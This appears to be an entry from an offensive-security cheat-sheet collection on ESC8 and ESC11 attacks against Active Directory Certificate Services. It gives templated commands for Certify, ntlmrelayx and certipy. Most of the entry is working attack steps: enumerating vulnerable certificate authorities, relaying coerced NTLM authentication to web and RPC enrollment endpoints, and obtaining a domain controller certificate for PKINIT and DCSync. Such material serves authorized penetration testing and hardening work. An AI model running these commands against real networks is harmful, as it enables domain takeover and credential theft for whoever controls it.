---
technique: ADCS Unsigned Enrollment Endpoints
category: adcs
targets: Certificate Authority Web Enrollment, ICPR RPC Endpoint
protocols: HTTP, HTTPS, RPC
remote_capable: true
tags: adcs esc ntlm-relay esc8 esc11 coercion pkinit
---

# ADCS Unsigned Enrollment Endpoints

AD CS HTTP-based enrollment endpoints and the ICPR RPC interface do not require signing by default, making them vulnerable to NTLM relay. ESC8 targets the web enrollment endpoint; ESC11 targets the RPC enrollment interface when IF_ENFORCEENCRYPTICERTREQUEST is not set. Both require coercing a victim to authenticate to the relay listener.

## Windows

### Certify: enumerate web endpoints (ESC8)

#powershell #certify #enum

Enumerate enabled web enrollment endpoints (HTTP and HTTPS) on all CAs; if any are present, conduct the relay from a Linux host.

```powershell title:"ESC8: enumerate enabled CA web enrollment endpoints"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

## Linux

### ntlmrelayx: ESC8 web endpoint relay

#python #ntlmrelayx #ntlm-relay #http

Start ntlmrelayx targeting the certsrv web enrollment endpoint; pair with a coercion technique to force the target account to authenticate.

```sh title:"ESC8: relay coerced NTLM to certsrv web enrollment"
ntlmrelayx.py -t http://$ca_fqdn/certsrv/certfnsh.asp --adcs --template "$template_name"
```
<!-- cheat
import domain_ip
var ca_fqdn
var template_name
-->

### ntlmrelayx: ESC11 RPC endpoint relay

#python #ntlmrelayx #ntlm-relay #rpc #icpr

Relay to the ICPR RPC interface when IF_ENFORCEENCRYPTICERTREQUEST is absent; specify the CA name with -icpr-ca-name and use -rpc-mode ICPR.

```sh title:"ESC11: relay coerced NTLM to ICPR RPC enrollment endpoint"
ntlmrelayx.py -t rpc://$ca_fqdn -rpc-mode ICPR -icpr-ca-name $ca_name --smb2support --template "$template_name"
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
var template_name
-->

### certipy: enumerate ESC8 and ESC11 CAs

#certipy #enum

Find CAs vulnerable to ESC8 or ESC11 and list enabled auth templates suitable for use with the relay.

```sh title:"ESC8/ESC11: find vulnerable CAs and usable templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### certipy relay: ESC8 DC template

#certipy #relay #ntlm-relay #http #dc

Relay coerced NTLM from a domain controller to certsrv using certipy relay; DomainController template issues a cert that can PKINIT as the DC for DCSync.

```sh title:"ESC8: certipy relay for DC cert (DomainController template)"
certipy relay -target "http://$ca_fqdn" -template DomainController
```
<!-- cheat
import domain_ip
var ca_fqdn
-->
